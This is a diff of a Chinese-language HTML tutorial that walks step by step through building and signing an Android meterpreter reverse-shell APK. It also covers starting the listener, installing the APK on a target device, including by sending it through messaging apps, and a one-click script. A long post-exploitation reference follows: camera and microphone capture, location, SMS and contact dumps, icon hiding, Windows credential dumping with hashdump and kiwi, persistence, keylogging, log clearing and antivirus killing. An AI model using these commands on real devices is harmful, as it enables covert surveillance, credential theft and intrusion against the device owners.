+                <p><strong>实际示例：</strong></p>
+                <pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o evil.apk</code></pre>
+
+                <p><strong>输出示例：</strong></p>
+                <pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+[-] No arch selected, selecting arch: dalvik from the payload
+No encoder specified, outputting raw payload
+Payload size: 10146 bytes</code></pre>
+
+                <p><strong>Android Payload 选项：</strong></p>
+                <table>
+                    <thead><tr><th>Payload</th><th>说明</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>android/meterpreter/reverse_tcp</code></td><td>标准 TCP 反弹（推荐，最常用）</td></tr>
+                        <tr><td><code>android/meterpreter/reverse_https</code></td><td>HTTPS 加密反弹，更难被检测</td></tr>
+                        <tr><td><code>android/meterpreter_reverse_tcp</code></td><td>Stageless 版本（单文件，体积更大但更稳）</td></tr>
+                    </tbody>
+                </table>
+
+                <hr />
+
+                <h3>步骤 2：签名 APK（关键步骤）</h3>
+
+                <blockquote>
+                    <p>Android 系统<strong>禁止安装未签名的 APK</strong>。如果直接把 <code>evil.apk</code> 发给靶机，会提示「解析失败」或「安装包破损」。</p>
+                </blockquote>
+
+                <p><strong>第 1 小步：生成签名证书（只需做一次）</strong></p>
+                <pre><code>keytool -genkey -v -keystore my.keystore -alias my -keyalg RSA \
   -keysize 2048 -validity 9125 \
   -noprompt \
-  -dname &quot;CN=Test, OU=Dev, O=Lab, L=City, S=State, C=CN&quot; \
-  -storepass 123456 -keypass 123456
+  -dname "CN=Test, OU=Dev, O=Lab, L=City, S=State, C=CN" \
+  -storepass 123456 -keypass 123456</code></pre>
 
-# 第二步：使用证书签名 APK
-jarsigner -verbose \
+                <p><strong>参数说明：</strong></p>
+                <table>
+                    <thead><tr><th>参数</th><th>含义</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>-genkey</code></td><td>生成密钥对</td></tr>
+                        <tr><td><code>-keystore my.keystore</code></td><td>密钥库存到哪个文件</td></tr>
+                        <tr><td><code>-alias my</code></td><td>密钥别名（后面签名时用）</td></tr>
+                        <tr><td><code>-validity 9125</code></td><td>证书有效期，9125 天≈25 年</td></tr>
+                        <tr><td><code>123456</code></td><td>密钥库密码（实验用简单密码就行）</td></tr>
+                    </tbody>
+                </table>
+
+                <p><strong>第 2 小步：用证书签名 APK</strong></p>
+                <pre><code>jarsigner -verbose \
   -keystore my.keystore \
   -storepass 123456 \
   -keypass 123456 \
   -signedjar signed.apk \
   evil.apk \
-  my
+  my</code></pre>
 
-# 第三步：验证签名
-jarsigner -verify -verbose signed.apk
-</code></pre>
-<p><strong>参数详解：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>-genkey</code></td>
-<td>生成密钥对</td>
-</tr>
-<tr>
-<td><code>-keystore my.keystore</code></td>
-<td>密钥库文件名</td>
-</tr>
-<tr>
-<td><code>-alias my</code></td>
-<td>别名（签名时引用）</td>
-</tr>
-<tr>
-<td><code>-keyalg RSA</code></td>
-<td>密钥算法</td>
-</tr>
-<tr>
-<td><code>-keysize 2048</code></td>
-<td>密钥长度</td>
-</tr>
-<tr>
-<td><code>-validity 9125</code></td>
-<td>证书有效期（天），9125≈25年</td>
-</tr>
-<tr>
-<td><code>-signedjar signed.apk</code></td>
-<td>签名后的输出文件</td>
-</tr>
-<tr>
-<td><code>123456</code></td>
-<td>密钥库密码（生产环境请使用强密码）</td>
-</tr>
-</tbody>
-</table>
-<p><strong>注意：</strong> 安装时使用 <code>signed.apk</code>，而非未签名的 <code>evil.apk</code>。</p>
-<hr />
-<h3 id="3">步骤 3：启动监听器</h3>
-<pre><code class="language-bash">msfconsole -q -x &quot;
+                <p><code>signed.apk</code> 就是签名后可以安装的 APK。<code>evil.apk</code> 是未签名的，不能安装。</p>
+
+                <p><strong>第 3 小步：验证签名是否成功</strong></p>
+                <pre><code>jarsigner -verify -verbose signed.apk</code></pre>
+                <p>看到 <code>jar verified.</code> 就说明签名正确。</p>
+
+                <hr />
+
+                <h3>步骤 3：启动 MSF 监听</h3>
+                <pre><code>msfconsole -q -x "
 use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set LHOST 192.168.1.100
 set LPORT 4444
 exploit -j -z
-&quot;
-</code></pre>
-<p><strong>预期输出：</strong></p>
-<pre><code>[*] Started reverse TCP handler on 192.168.1.100:4444
-</code></pre>
-<hr />
-<h3 id="4-apk">步骤 4：靶机安装 APK</h3>
-<p><strong>方式一：通过 ADB（推荐，适合模拟器/开发者模式真机）</strong></p>
-<pre><code class="language-bash"># 确认设备连接
+"</code></pre>
+
+                <p><code>-q</code> 是安静启动（不显示 logo），<code>-x</code> 是执行后面的命令。</p>
+
+                <p><strong>预期输出：</strong></p>
+                <pre><code>[*] Started reverse TCP handler on 192.168.1.100:4444</code></pre>
+
+                <hr />
+
+                <h3>步骤 4：靶机安装 APK</h3>
+
+                <p><strong>方式一：ADB 安装（推荐，适合模拟器）</strong></p>
+                <pre><code># 确认设备已连接
 adb devices
 # 输出：emulator-5554   device
 
-# 推送 APK 到设备
+# 推送到设备
 adb push signed.apk /sdcard/
 
-# 在设备上安装
+# 安装
 adb install signed.apk
 
-# 如果更新已有 APK
-adb install -r signed.apk
-</code></pre>
-<p><strong>ADB 环境配置（Windows）：</strong></p>
-<ol>
-<li>下载 <a href="https://developer.android.com/tools/releases/platform-tools">Android SDK Platform Tools</a></li>
-<li>解压到 <code>C:\platform-tools\</code></li>
-<li>将 <code>C:\platform-tools\</code> 添加到系统环境变量 PATH</li>
-<li>打开 CMD 验证：<code>adb version</code></li>
-</ol>
-<p><strong>方式二：直接传输安装</strong></p>
-<ol>
-<li>将 <code>signed.apk</code> 通过微信/QQ/网盘传给目标设备</li>
-<li>在文件管理器中找到 APK 文件</li>
-<li>点击安装，允许「未知来源」权限</li>
-<li>安装完成后桌面出现应用图标</li>
-</ol>
-<p><strong>推荐模拟器：</strong></p>
-<table>
-<thead>
-<tr>
-<th>模拟器</th>
-<th>特点</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Android Studio AVD</td>
-<td>官方模拟器，兼容性最好</td>
-</tr>
-<tr>
-<td>MuMu 模拟器</td>
-<td>性能好，适合游戏测试</td>
-</tr>
-<tr>
-<td>夜神模拟器</td>
-<td>支持多开，自带 Root</td>
-</tr>
-<tr>
-<td>Genymotion</td>
-<td>专业安卓虚拟化</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h3 id="5_1">步骤 5：进入会话</h3>
-<pre><code class="language-bash">sessions           # 查看所有会话
-sessions -i 1      # 进入第一个会话
-</code></pre>
-<hr />
-<h3 id="6">步骤 6：核心后渗透命令</h3>
-<p><strong>系统信息：</strong></p>
-<pre><code class="language-bash">meterpreter &gt; sysinfo
+# 如果更新已有 APK（覆盖安装）
+adb install -r signed.apk</code></pre>
+
+                <p><strong>ADB 环境配置（Windows）：</strong></p>
+                <ol>
+                    <li>下载 <a href="https://developer.android.com/tools/releases/platform-tools" target="_blank" rel="noopener">Android SDK Platform Tools</a></li>
+                    <li>解压到 <code>C:\platform-tools\</code></li>
+                    <li>把 <code>C:\platform-tools\</code> 加入系统 PATH 环境变量</li>
+                    <li>打开 CMD 验证：<code>adb version</code></li>
+                </ol>
+
+                <p><strong>方式二：直接传文件安装</strong></p>
+                <ol>
+                    <li>把 <code>signed.apk</code> 通过微信/QQ/网盘传到靶机</li>
+                    <li>靶机上找到 APK 文件，点击安装</li>
+                    <li>系统会提示「未知来源」→ 去设置里允许「安装未知应用」</li>
+                    <li>安装完成后桌面出现应用图标</li>
+                </ol>
+
+                <p><strong>推荐模拟器：</strong></p>
+                <table>
+                    <thead><tr><th>模拟器</th><th>特点</th></tr></thead>
+                    <tbody>
+                        <tr><td>Android Studio AVD</td><td>官方模拟器，兼容性最好</td></tr>
+                        <tr><td>MuMu 模拟器</td><td>性能好，适合游戏测试</td></tr>
+                        <tr><td>夜神模拟器</td><td>支持多开，自带 Root</td></tr>
+                        <tr><td>Genymotion</td><td>专业安卓虚拟化平台</td></tr>
+                    </tbody>
+                </table>
+
+                <hr />
+
+                <h3>步骤 5：进入会话</h3>
+                <pre><code>sessions             # 查看所有会话
+sessions -i 1        # 进入第一个会话</code></pre>
+
+                <hr />
+
+                <h3>步骤 6：核心后渗透功能演示</h3>
+
+                <p><strong>系统信息：</strong></p>
+                <pre><code>meterpreter > sysinfo
 # Computer        : localhost
 # OS              : Android 12 - Linux 5.4.32 (aarch64)
 # Architecture    : aarch64
 # System Language : zh_CN
 # Meterpreter     : dalvik/android
 
-meterpreter &gt; getuid          # 当前用户权限
-meterpreter &gt; check_root      # 检查是否已 root
-</code></pre>
-<p><strong>进入 Android Shell：</strong></p>
-<pre><code class="language-bash">meterpreter &gt; shell
-# 进入安卓系统的 Linux Shell 环境
+meterpreter > getuid             # 当前用户权限
+meterpreter > check_root         # 检查手机是否 root 了</code></pre>
 
-$ whoami           # 查看当前用户
-$ id               # 查看 UID/GID
-$ uname -a         # 内核信息
-$ getprop ro.build.version.sdk  # 查看 SDK 版本
-$ pm list packages | grep &lt;关键词&gt;  # 列出已安装应用
-$ exit             # 返回 meterpreter
-</code></pre>
-<p><strong>文件操作：</strong></p>
-<pre><code class="language-bash">meterpreter &gt; ls /sdcard
-meterpreter &gt; cd /sdcard/DCIM/Camera
-meterpreter &gt; download IMG_001.jpg /root/loot/
-meterpreter &gt; upload /root/payload.sh /sdcard/
-meterpreter &gt; cat /sdcard/Download/notes.txt
-meterpreter &gt; search -f *.pdf -d /sdcard
-</code></pre>
-<p><strong>摄像头 &amp; 音频：</strong></p>
-<pre><code class="language-bash">meterpreter &gt; webcam_list        # 列出摄像头（通常有前后两个）
-meterpreter &gt; webcam_snap        # 拍照（保存到 /root）
-meterpreter &gt; webcam_stream      # 实时视频流（浏览器查看）
-meterpreter &gt; record_mic -d 10   # 录制 10 秒音频
-meterpreter &gt; play /sdcard/alert.wav  # 播放音频文件
-</code></pre>
-<p><strong>定位：</strong></p>
-<pre><code class="language-bash">meterpreter &gt; geolocate          # GPS 定位
-meterpreter &gt; wlan_geolocate     # WiFi 定位（通常更准确）
-</code></pre>
-<p><strong>通讯录/短信/通话记录（需 root 权限）：</strong></p>
-<pre><code class="language-bash">meterpreter &gt; dump_sms           # 导出短信
-meterpreter &gt; dump_contacts      # 导出通讯录
-meterpreter &gt; dump_calllog       # 导出通话记录
-</code></pre>
-<p><strong>发送短信：</strong></p>
-<pre><code class="language-bash">meterpreter &gt; send_sms -d +8613800138000 -t &quot;Test message from MSF&quot;
-</code></pre>
-<p><strong>隐藏应用图标：</strong></p>
-<pre><code class="language-bash">meterpreter &gt; hide_app_icon      # 隐藏桌面图标（保持后台运行）
-</code></pre>
-<hr />
-<h3 id="7_1">步骤 7：一键脚本</h3>
-<p>将以下脚本保存为 <code>android_rush.sh</code>，一键完成生成+签名+启动监听：</p>
-<pre><code class="language-bash">#!/bin/bash
+                <p><strong>进入 Android Shell：</strong></p>
+                <pre><code>meterpreter > shell
+# 现在你进入了安卓的 Linux Shell 环境
+
+$ whoami                          # 查看当前用户
+$ id                              # 查看 UID/GID
+$ uname -a                        # 内核信息
+$ getprop ro.build.version.sdk    # SDK 版本
+$ pm list packages                # 列出所有已安装的应用
+$ pm list packages | grep wechat  # 搜索特定应用
+$ exit                            # 返回 meterpreter</code></pre>
+
+                <p><strong>文件操作：</strong></p>
+                <pre><code>meterpreter > ls /sdcard
+meterpreter > cd /sdcard/DCIM/Camera
+meterpreter > download IMG_001.jpg /root/loot/
+meterpreter > upload /root/payload.sh /sdcard/
+meterpreter > cat /sdcard/Download/notes.txt
+meterpreter > search -f *.pdf -d /sdcard</code></pre>
+
+                <p><strong>摄像头 & 音频：</strong></p>
+                <pre><code>meterpreter > webcam_list       # 列出所有摄像头（一般有两个：前置和后置）
+meterpreter > webcam_snap       # 拍照（保存到 Kali 的 /root 目录）
+meterpreter > webcam_stream     # 实时视频流（在浏览器看）
+meterpreter > record_mic -d 10  # 录制 10 秒音频
+meterpreter > play /sdcard/ringtone.mp3  # 在靶机上播放音频</code></pre>
+
+                <p><strong>定位：</strong></p>
+                <pre><code>meterpreter > geolocate          # GPS 定位
+meterpreter > wlan_geolocate     # WiFi 定位（通常比 GPS 更准）</code></pre>
+
+                <p><strong>通讯录 / 短信（需要 root）：</strong></p>
+                <pre><code>meterpreter > dump_sms           # 导出短信
+meterpreter > dump_contacts      # 导出通讯录
+meterpreter > dump_calllog       # 导出通话记录</code></pre>
+
+                <p><strong>发送短信：</strong></p>
+                <pre><code>meterpreter > send_sms -d +8613800138000 -t "测试消息"</code></pre>
+
+                <p><strong>隐藏应用图标：</strong></p>
+                <pre><code>meterpreter > hide_app_icon     # 桌面图标消失，后台继续运行</code></pre>
+
+                <hr />
+
+                <h3>步骤 7：一键脚本（可选）</h3>
+                <p>把下面内容保存为 <code>android_rush.sh</code>，一次搞定生成+签名+提示监听命令：</p>
+                <pre><code>#!/bin/bash
 # Android 远控一键脚本
-# 用法：chmod +x android_rush.sh &amp;&amp; ./android_rush.sh
+# 用法：chmod +x android_rush.sh && ./android_rush.sh
 
 IP=$(hostname -I | awk '{print $1}')
 PORT=4444
 
-echo &quot;=== Kali IP: $IP ===&quot;
-echo &quot;=== 监听端口: $PORT ===&quot;
+echo "=== Kali IP: $IP ==="
+echo "=== 监听端口: $PORT ==="
+echo ""
 
-# 生成 APK
-echo &quot;[1/3] 生成 APK...&quot;
+echo "[1/3] 生成 APK..."
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o evil.apk
 
-# 签名（首次自动生成证书）
-echo &quot;[2/3] 签名 APK...&quot;
+echo "[2/3] 签名 APK..."
 if [ ! -f my.keystore ]; then
     keytool -genkey -keystore my.keystore -alias my -keyalg RSA \
       -keysize 2048 -validity 9125 -noprompt \
-      -dname &quot;CN=Test, OU=Dev, O=Lab, L=City, S=State, C=CN&quot; \
+      -dname "CN=Test, OU=Dev, O=Lab, L=City, S=State, C=CN" \
       -storepass 123456 -keypass 123456
 fi
 jarsigner -keystore my.keystore -storepass 123456 -keypass 123456 \
   -signedjar signed.apk evil.apk my
 
-echo &quot;[3/3] 完成！&quot;
-echo &quot;&gt;&gt;&gt; 签名完成：$(pwd)/signed.apk&quot;
-echo &quot;&quot;
-echo &quot;&gt;&gt;&gt; 在新终端启动监听：&quot;
-echo &quot;msfconsole -q -x \&quot;use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; exploit -j -z\&quot;&quot;
-</code></pre>
-<p><strong>使用方式：</strong></p>
-<pre><code class="language-bash">chmod +x android_rush.sh
-./android_rush.sh
-</code></pre>
-<hr />
-<h2 id="3-meterpreter">3. Meterpreter 后渗透完整指令手册</h2>
-<blockquote>
-<p>所有命令均在 <code>meterpreter &gt;</code> 提示符下执行。</p>
-</blockquote>
-<h3 id="31">3.1 文件系统操作</h3>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>ls</code></td>
-<td>列出当前目录</td>
-<td><code>ls C:\\Users\\</code></td>
-</tr>
-<tr>
-<td><code>pwd</code></td>
-<td>当前工作目录（目标机）</td>
-<td><code>pwd</code></td>
-</tr>
-<tr>
-<td><code>cd &lt;path&gt;</code></td>
-<td>切换目录</td>
-<td><code>cd C:\\Users\\Admin\\Desktop</code></td>
-</tr>
-<tr>
-<td><code>cat &lt;file&gt;</code></td>
-<td>查看文件内容</td>
-<td><code>cat passwords.txt</code></td>
-</tr>
-<tr>
-<td><code>edit &lt;file&gt;</code></td>
-<td>编辑文件（打开 vim）</td>
-<td><code>edit config.ini</code></td>
-</tr>
-<tr>
-<td><code>mkdir &lt;dir&gt;</code></td>
-<td>创建目录</td>
-<td><code>mkdir C:\\temp\\</code></td>
-</tr>
-<tr>
-<td><code>rmdir &lt;dir&gt;</code></td>
-<td>删除目录</td>
-<td><code>rmdir C:\\temp\\</code></td>
-</tr>
-<tr>
-<td><code>rm &lt;file&gt;</code></td>
-<td>删除文件</td>
-<td><code>rm evidence.log</code></td>
-</tr>
-<tr>
-<td><code>cp &lt;src&gt; &lt;dst&gt;</code></td>
-<td>复制文件</td>
-<td><code>cp a.txt b.txt</code></td>
-</tr>
-<tr>
-<td><code>mv &lt;src&gt; &lt;dst&gt;</code></td>
-<td>移动/重命名文件</td>
-<td><code>mv payload.exe svchost.exe</code></td>
-</tr>
-<tr>
-<td><code>search -f &lt;pattern&gt; -d &lt;path&gt;</code></td>
-<td>搜索文件</td>
-<td><code>search -f *.docx -d C:\\Users\\</code></td>
-</tr>
-<tr>
-<td><code>upload &lt;local&gt; &lt;remote&gt;</code></td>
-<td>上传文件到目标</td>
-<td><code>upload /root/nc.exe C:\\Windows\\Temp\\</code></td>
-</tr>
-<tr>
-<td><code>download &lt;remote&gt; &lt;local&gt;</code></td>
-<td>下载文件到 Kali</td>
-<td><code>download C:\\data.db /root/loot/</code></td>
-</tr>
-<tr>
-<td><code>checksum md5 &lt;file&gt;</code></td>
-<td>计算文件哈希</td>
-<td><code>checksum md5 C:\\Windows\\System32\\config\\SAM</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="32">3.2 系统信息 &amp; 状态</h3>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>sysinfo</code></td>
-<td>系统信息（OS 版本、架构、域等）</td>
-</tr>
-<tr>
-<td><code>getuid</code></td>
-<td>当前用户权限（如 <code>NT AUTHORITY\SYSTEM</code>）</td>
-</tr>
-<tr>
-<td><code>getpid</code></td>
-<td>当前 Meterpreter 所在进程 PID</td>
-</tr>
-<tr>
-<td><code>getprivs</code></td>
-<td>列出当前进程拥有的权限</td>
-</tr>
-<tr>
-<td><code>ps</code></td>
-<td>列出所有运行中的进程</td>
-</tr>
-<tr>
-<td><code>pgrep &lt;name&gt;</code></td>
-<td>按名称搜索进程</td>
-</tr>
-<tr>
-<td><code>kill &lt;pid&gt;</code></td>
-<td>结束指定 PID 的进程</td>
-</tr>
-<tr>
-<td><code>execute -f &lt;程序&gt;</code></td>
-<td>执行程序</td>
-</tr>
-<tr>
-<td><code>shell</code></td>
-<td>进入目标系统 Shell（Windows 为 cmd，Linux 为 bash）</td>
-</tr>
-<tr>
-<td><code>idletime</code></td>
-<td>查看用户空闲时间（判断是否有人在用电脑）</td>
-</tr>
-<tr>
-<td><code>uptime</code></td>
-<td>系统运行时间</td>
-</tr>
-<tr>
-<td><code>reboot</code></td>
-<td>重启目标系统</td>
-</tr>
-<tr>
-<td><code>shutdown</code></td>
-<td>关闭目标系统</td>
-</tr>
-</tbody>
-</table>
-<p><strong><code>execute</code> 参数详解：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>-f</code></td>
-<td>指定要执行的程序</td>
-</tr>
-<tr>
-<td><code>-i</code></td>
-<td>交互模式（可看到输出）</td>
-</tr>
-<tr>
-<td><code>-H</code></td>
-<td>隐藏窗口（后台运行）</td>
-</tr>
-<tr>
-<td><code>-c</code></td>
-<td>传递命令行参数</td>
-</tr>
-</tbody>
-</table>
-<h3 id="33">3.3 权限提升 &amp; 凭据获取</h3>
-<pre><code class="language-bash">meterpreter &gt; getsystem
-# 尝试提权到 NT AUTHORITY\SYSTEM
+echo "[3/3] 完成！"
+echo ">>> 签名完成：$(pwd)/signed.apk"
+echo ""
+echo ">>> 在新终端启动监听："
+echo "msfconsole -q -x \"use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; exploit -j -z\""</code></pre>
+
+                <pre><code>chmod +x android_rush.sh && ./android_rush.sh</code></pre>
+
+                <hr />
+
+                <!-- ========== 第三章 ========== -->
+                <h2 id="meterpreter">第三章：Meterpreter 后渗透完整指令手册</h2>
+                <blockquote><p>以下所有命令均在 <code>meterpreter ></code> 提示符下执行。标记 (W) 的仅 Windows，标记 (A) 的仅 Android。</p></blockquote>
+
+                <h3>3.1 文件系统操作</h3>
+                <table>
+                    <thead><tr><th>命令</th><th>做什么</th><th>示例</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>ls</code></td><td>列出当前目录</td><td><code>ls C:\\Users\\</code></td></tr>
+                        <tr><td><code>pwd</code></td><td>当前工作目录（目标机）</td><td><code>pwd</code></td></tr>
+                        <tr><td><code>cd 路径</code></td><td>切换目录</td><td><code>cd C:\\Users\\Admin\\Desktop</code></td></tr>
+                        <tr><td><code>cat 文件</code></td><td>查看文件内容</td><td><code>cat passwords.txt</code></td></tr>
+                        <tr><td><code>edit 文件</code></td><td>编辑文件（打开 vim）</td><td><code>edit config.ini</code></td></tr>
+                        <tr><td><code>mkdir 目录</code></td><td>创建目录</td><td><code>mkdir C:\\temp</code></td></tr>
+                        <tr><td><code>rmdir 目录</code></td><td>删除目录</td><td><code>rmdir C:\\temp</code></td></tr>
+                        <tr><td><code>rm 文件</code></td><td>删除文件</td><td><code>rm evidence.log</code></td></tr>
+                        <tr><td><code>cp a b</code></td><td>复制文件</td><td><code>cp a.txt b.txt</code></td></tr>
+                        <tr><td><code>mv a b</code></td><td>移动/重命名</td><td><code>mv payload.exe svchost.exe</code></td></tr>
+                        <tr><td><code>search -f *.docx</code></td><td>搜索文件</td><td><code>search -f *.pdf -d C:\\Users\\</code></td></tr>
+                        <tr><td><code>upload 本地 远程</code></td><td>上传文件到目标</td><td><code>upload /root/nc.exe C:\\Windows\\Temp\\</code></td></tr>
+                        <tr><td><code>download 远程 本地</code></td><td>下载文件到 Kali</td><td><code>download C:\\data.db /root/loot/</code></td></tr>
+                    </tbody>
+                </table>
+
+                <h3>3.2 系统信息 & 状态</h3>
+                <table>
+                    <thead><tr><th>命令</th><th>做什么</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>sysinfo</code></td><td>系统信息（OS 版本、架构、域名）</td></tr>
+                        <tr><td><code>getuid</code></td><td>当前用户（如 <code>NT AUTHORITY\SYSTEM</code> 表示已提权）</td></tr>
+                        <tr><td><code>getpid</code></td><td>Meterpreter 所在进程的 PID</td></tr>
+                        <tr><td><code>getprivs</code></td><td>列出当前进程拥有的权限</td></tr>
+                        <tr><td><code>ps</code></td><td>列出所有运行中的进程</td></tr>
+                        <tr><td><code>pgrep 名字</code></td><td>按名称搜索进程</td></tr>
+                        <tr><td><code>kill PID</code></td><td>结束指定进程</td></tr>
+                        <tr><td><code>execute -f 程序</code></td><td>执行程序</td></tr>
+                        <tr><td><code>shell</code></td><td>进入目标系统 Shell（cmd / bash）</td></tr>
+                        <tr><td><code>idletime</code></td><td>用户空闲时间（判断是否有人在用电脑）</td></tr>
+                        <tr><td><code>uptime</code></td><td>系统运行了多久</td></tr>
+                    </tbody>
+                </table>
+
+                <p><strong>execute 参数详解：</strong></p>
+                <table>
+                    <thead><tr><th>参数</th><th>作用</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>-f 程序名</code></td><td>指定要执行的程序</td></tr>
+                        <tr><td><code>-i</code></td><td>交互模式（可以看到输出）</td></tr>
+                        <tr><td><code>-H</code></td><td>隐藏窗口（后台运行，靶机看不出）</td></tr>
+                        <tr><td><code>-c 参数</code></td><td>传递命令行参数</td></tr>
+                    </tbody>
+                </table>
+
+                <h3>3.3 权限提升 & 凭据获取 (W)</h3>
+                <pre><code>meterpreter > getsystem
+# 尝试提权到 NT AUTHORITY\SYSTEM（最高权限）
 # 常用技术：命名管道模拟、令牌复制
 
-meterpreter &gt; getprivs
-# 查看当前令牌权限，关键权限：
+meterpreter > getprivs
+# 关键权限说明：
 # SeDebugPrivilege       → 可调试/注入任意进程
 # SeImpersonatePrivilege → 可模拟客户端令牌
-# SeAssignPrimaryTokenPrivilege → 可分配主令牌
 
-meterpreter &gt; hashdump
-# 导出 SAM 数据库中的密码哈希（需 SYSTEM 权限）
+meterpreter > hashdump
+# 导出 SAM 中的密码哈希（需 SYSTEM 权限）
 # 输出格式：用户名:RID:LM哈希:NTLM哈希:::
 
-meterpreter &gt; load kiwi
-# 加载 Mimikatz 扩展（Kiwi）
+meterpreter > load kiwi              # 加载 Mimikatz（Kiwi 版）
+meterpreter > creds_all              # 导出所有缓存的凭据
+meterpreter > lsa_dump               # 导出 LSA 中的凭据
+meterpreter > creds_wdigest          # 导出 WDigest 凭据</code></pre>
 
-meterpreter &gt; creds_all
-# 导出所有已缓存的凭据（明文密码/NTLM哈希/Kerberos票据）
-
-meterpreter &gt; lsa_dump
-# 导出 LSA 中的凭据信息
-
-meterpreter &gt; creds_wdigest
-# 导出 WDigest 凭据（如果启用）
-</code></pre>
-<h3 id="34">3.4 进程迁移 &amp; 持久化</h3>
-<pre><code class="language-bash">meterpreter &gt; migrate &lt;PID&gt;
-# 将 Meterpreter 迁移到稳定进程（如 explorer.exe、svchost.exe）
+                <h3>3.4 进程迁移 & 持久化 (W)</h3>
+                <pre><code>meterpreter > migrate 目标PID
+# 把 Meterpreter 注入到稳定进程（如 explorer.exe）
 # 迁移后原进程退出，payload 在新进程中存活
 
-meterpreter &gt; run post/windows/manage/migrate
+meterpreter > run post/windows/manage/migrate
 # 自动选择合适进程迁移
 
-meterpreter &gt; run persistence -U -i 5 -p 4444 -r &lt;Kali IP&gt;
-# 安装启动项持久化
+# 安装启动项持久化（靶机每次开机自动回连）
+meterpreter > run persistence -U -i 5 -p 4444 -r 你的KaliIP
 # -U: 用户登录时启动
-# -i 5: 每 5 秒回连
+# -i 5: 每 5 秒尝试回连
 # -p 4444: 回连端口
-# -r IP: 回连地址
+# -r IP: 回连地址</code></pre>
 
-meterpreter &gt; run metsvc -A
-# 安装 Meterpreter 服务（以 Windows 服务形式持久化）
-# 注意：杀软可能会检测到此服务
-</code></pre>
-<p><strong>迁移最佳实践：</strong></p>
-<ul>
-<li>优先迁移到 <code>explorer.exe</code>（用户态进程，长期存活）</li>
-<li>避免迁移到杀软进程（会触发自我保护）</li>
-<li>32 位 payload 只能迁移到 32 位进程</li>
-<li>64 位 payload 只能迁移到 64 位进程</li>
-</ul>
-<h3 id="35">3.5 屏幕、摄像头、音频</h3>
-<pre><code class="language-bash">meterpreter &gt; screenshot
-# 截取当前屏幕，保存为 JPEG 文件
+                <p><strong>迁移最佳实践：</strong></p>
+                <ul>
+                    <li>优先迁移到 <code>explorer.exe</code>（用户态，长期存活）</li>
+                    <li>不要迁移到杀软进程（会触发自我保护）</li>
+                    <li>32 位 payload 只能迁移到 32 位进程，64 位同理</li>
+                </ul>
 
-meterpreter &gt; screenshare
-# 实时桌面共享（通过浏览器查看）
+                <h3>3.5 屏幕 / 摄像头 / 音频</h3>
+                <pre><code>meterpreter > screenshot             # 截图，保存为 JPEG
+meterpreter > screenshare            # 实时桌面共享（浏览器看）
+meterpreter > webcam_list            # 列出所有摄像头
+meterpreter > webcam_snap            # 默认摄像头拍照
+meterpreter > webcam_stream          # 实时视频流
+meterpreter > record_mic -d 30       # 录制 30 秒音频
+meterpreter > play 音频文件          # 在目标机播放音频</code></pre>
 
-meterpreter &gt; webcam_list
-# 列出所有摄像头
+                <h3>3.6 键盘记录 (W)</h3>
+                <pre><code>meterpreter > keyscan_start          # 开始记录键盘输入
+meterpreter > keyscan_dump           # 输出已捕获的按键
+meterpreter > keyscan_stop           # 停止记录</code></pre>
 
-meterpreter &gt; webcam_snap
-# 使用默认摄像头拍照
+                <h3>3.7 网络相关</h3>
+                <pre><code>meterpreter > ipconfig / ifconfig    # 网络配置
+meterpreter > netstat -an            # 所有网络连接
+meterpreter > route                  # 路由表
+meterpreter > arp                    # ARP 缓存
 
-meterpreter &gt; webcam_stream
-# 开启摄像头实时视频流
+# 端口转发：把目标内网端口映射到 Kali 本地
+meterpreter > portfwd add -l 1234 -p 3389 -r 127.0.0.1
+# 之后在 Kali 上 mstsc 连 127.0.0.1:1234 就是连目标机的远程桌面
 
-meterpreter &gt; record_mic -d &lt;秒数&gt;
-# 录制麦克风音频
+meterpreter > portfwd list           # 列出所有转发规则
+meterpreter > portfwd delete -l 1234 # 删除指定转发</code></pre>
 
-meterpreter &gt; play &lt;音频文件路径&gt;
-# 在目标机上播放音频文件
-</code></pre>
-<h3 id="36">3.6 键盘记录</h3>
-<pre><code class="language-bash">meterpreter &gt; keyscan_start
-# 开始记录键盘输入
-# 会捕获目标机的所有按键
+                <h3>3.8 清除痕迹 (W)</h3>
+                <pre><code>meterpreter > clearev               # 清除 Application、System、Security 三类事件日志</code></pre>
 
-meterpreter &gt; keyscan_dump
-# 输出已捕获的键盘记录
+                <h3>3.9 其他实用模块</h3>
+                <pre><code>meterpreter > run scraper            # 自动收集大量系统信息
+meterpreter > run killav              # 尝试关闭杀毒软件
+meterpreter > run post/windows/gather/checkvm  # 检测是否虚拟机
+meterpreter > run post/multi/recon/local_exploit_suggester  # 自动检测提权漏洞
+meterpreter > load powershell         # 加载 PowerShell 扩展
+meterpreter > powershell_execute "Get-Process"  # 执行 PowerShell 命令
+meterpreter > background             # 会话放后台，返回 msf 控制台</code></pre>
 
-meterpreter &gt; keyscan_stop
-# 停止键盘记录
-</code></pre>
-<p><strong>注意：</strong> <code>keyscan_start</code> 会扫描目标机所有窗口的键盘输入，包括密码输入框。</p>
-<h3 id="37">3.7 用户 &amp; 远程桌面</h3>
-<pre><code class="language-bash">meterpreter &gt; run post/windows/gather/enum_logged_on_users
-# 枚举已登录用户
+                <hr />
 
-meterpreter &gt; run getgui -u &lt;用户名&gt; -p &lt;密码&gt;
-# 创建用户并启用 RDP
